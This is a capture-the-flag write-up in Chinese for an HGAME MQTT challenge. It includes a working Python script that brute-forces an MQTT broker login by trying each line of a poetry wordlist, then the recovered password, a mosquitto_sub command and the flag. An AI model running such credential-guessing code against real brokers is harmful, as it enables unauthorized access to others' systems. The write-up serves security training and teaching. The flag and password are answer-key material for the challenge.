# Help the uncle who can't jump twice

## 题目简述

题目提供一个 MQTT Broker、用户名 `Vergil`，以及一本英文诗集作为密码字典。目标是找出 MQTT 密码，并订阅正确的主题以接收 flag。服务禁止直接订阅全局通配主题 `#`，因此还需要从题面线索推断主题层级。

## 解题过程

MQTT 的连接确认包会返回明确的认证结果，因此可以逐行读取诗集，将每一行作为候选密码尝试连接。测试程序应在收到 `CONNACK` 后记录返回码并断开，不能在第一个候选密码上直接进入永久事件循环，否则字典不会继续枚举。

字典枚举的核心逻辑如下，Broker 地址使用题目实例提供的值：

```python
import os
from pathlib import Path
from threading import Event

import paho.mqtt.client as mqtt

HOST = os.environ.get("HGAME_MQTT_HOST", "broker.example")
PORT = 1883
USERNAME = "Vergil"
WORDLIST = Path("Songs of Innocence and of Experience.txt")


def accepted(password: str) -> bool:
    finished = Event()
    state = {"ok": False}

    def on_connect(client, userdata, flags, reason_code, properties=None):
        state["ok"] = int(reason_code) == 0
        finished.set()

    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
    client.username_pw_set(USERNAME, password)
    client.on_connect = on_connect

    try:
        client.connect(HOST, PORT, keepalive=5)
        client.loop_start()
        finished.wait(timeout=2)
    except OSError:
        return False
    finally:
        client.loop_stop()
        client.disconnect()

    return state["ok"]


for line in WORDLIST.read_text(encoding="utf-8").splitlines():
    candidate = line.strip()
    if candidate and accepted(candidate):
        print(candidate)
        break
```

有效密码为：

```text
power
```

题目中的人物线索指向 `Nero`，有效消息位于其主题树下。可以精确订阅 `Nero/YAMATO`；若要观察该层级的全部消息，也可使用只覆盖该子树的通配主题 `Nero/#`，这不等同于被服务禁止的全局 `#`。

```bash
HGAME_MQTT_HOST='broker.example'
mosquitto_sub \
  -h "$HGAME_MQTT_HOST" \
  -p 1883 \
  -u 'Vergil' \
  -P 'power' \
  -t 'Nero/YAMATO' \
  -v
```

订阅成功后收到：

```text
hgame{mqtt_1s_p0w3r}
```

## 方法总结

本题结合了 MQTT 认证与主题订阅。枚举密码时应以 `CONNACK` 的认证返回码为判断依据，并为每次连接设置超时；获得凭据后，再根据题面语义缩小主题范围。MQTT 中 `#` 会匹配当前层级以下的所有主题，`Nero/#` 只覆盖 `Nero` 子树，因此在全局通配被禁用时仍可能是合法且更安全的订阅方式。
